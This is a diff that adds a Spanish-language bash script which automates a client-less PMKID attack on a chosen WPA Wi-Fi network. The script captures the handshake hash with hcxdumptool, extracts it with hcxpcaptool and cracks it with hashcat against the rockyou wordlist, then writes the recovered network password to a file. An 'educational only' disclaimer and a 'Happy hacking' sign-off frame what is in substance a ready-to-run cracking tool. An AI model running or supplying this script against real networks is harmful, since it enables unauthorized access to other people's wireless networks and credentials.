@@ -1,0 +1,41 @@
+#!/bin/bash
+
+# ---- Desarrollado por zodi4c
+# No me hago responsable del mal uso que se pueda hacer con este programa, pues su fin es meramente educativo, no malicioso
+
+#Colours
+greenColour="\e[0;32m\033[1m"
+endColour="\033[0m\e[0m"
+redColour="\e[0;31m\033[1m"
+blueColour="\e[0;34m\033[1m"
+yellowColour="\e[0;33m\033[1m"
+purpleColour="\e[0;35m\033[1m"
+turquoiseColour="\e[0;36m\033[1m"
+grayColour="\e[0;37m\033[1m"
+
+echo -e """${turquoiseColour}db   dD d888888b d8888b. .d8888. d888888b d88888b  .d8b.  db      d88888b d8888b. """
+echo -e """88 ,8P'   \`88'   88  \`8D 88'  YP \`~~88~~' 88'     d8' \`8b 88      88'     88  \`8D """
+echo -e """88,8P      88    88   88 \`8bo.      88    88ooooo 88ooo88 88      88ooooo 88oobY' """
+echo -e """88\`8b      88    88   88   \`Y8b.    88    88~~~~~ 88~~~88 88      88~~~~~ 88\`8b   """
+echo -e """88 \`88.   .88.   88  .8D db   8D    88    88.     88   88 88booo. 88.     88 \`88. """
+echo -e """YP   YD Y888888P Y8888D' \`8888Y'    YP    Y88888P YP   YP Y88888P Y88888P 88   YD ${endColour}${purpleColour} \n----- desarrollado por Javier Correa (zodi4c)${endColour}\n"""
+
+echo -ne "\n${yellowColour}[?]${endColour} ${blueColour}Introduce el BSSID de la red a atacar: ${endColour}" && read bssid
+echo -ne "${yellowColour}[?]${endColour} ${blueColour}Selecciona un dispositivo de red en modo monitor${endColour} ${yellowColour}[" && echo -n $(ifconfig | sed '/^ /d' | sed '/^\s*$/d' | cut -d ':' -f 1 | xargs | tr ' ' ',') && echo -ne "]:${endColour} " && read mondev
+
+echo "${bssid^^}" | sed 's/://g' > filter.txt
+
+echo -e "\n${turquoiseColour}[*]${endColour} ${blueColour}Iniciando captura...${endColour}"
+echo -e "${redColour}[!]${endColour} ${blueColour}Pulsa Ctrl+C cuando aparezca ${redColour}[FOUND PMKID CLIENT-LESS]${endColour} ${blueColour}en el output${endColour}" && sleep 3
+./hcxdumptool/hcxdumptool -i $mondev -o hash.tmp --filterlist=filter.txt --filtermode=2 --enable_status=1
+echo -e "\n${turquoiseColour}[*]${endColour} ${blueColour}Extrayendo hash de la captura...${endColour}" && sleep 2
+./hcxtools/hcxpcaptool -z pass hash.tmp && echo -e "\n${greenColour}[✓]${endColour} ${blueColour}¡Hecho!\n${endColour}" && sleep 2
+echo -ne "${yellowColour}[?]${endColour} ${blueColour}Selecciona un diccionario para el ataque (rockyou.txt por defecto):${endColour} " && read dicc
+if [ -z "$dicc" ]; then dicc="/usr/share/wordlists/rockyou.txt"; fi
+echo -e "${turquoiseColour}[*]${endColour} ${blueColour}Inicializando ataque de diccionario a través de Hashcat, esto puede llevar un tiempo\n${endColour}" && sleep 3
+./hashcat/hashcat -a 0 -m 16800 pass $dicc --force
+echo -e "\n${greenColour}[✓]${endColour} ${blueColour}¡Ataque completado con éxito! A continuación, se mostrará la contraseña crackeada:\n${endColour}"
+./hashcat/hashcat -a 0 -m 16800 pass /usr/share/wordlists/rockyou.txt --force --show | tee pass.txt
+echo -e "${turquoiseColour}[*]${endColour} ${blueColour}Hash desencriptado almacenado en pass.txt${endColour}"
+rm filter.txt hash.tmp pass
+sleep 2 && echo -e "\n${grayColour}Happy hacking! =)\n${endColour}"
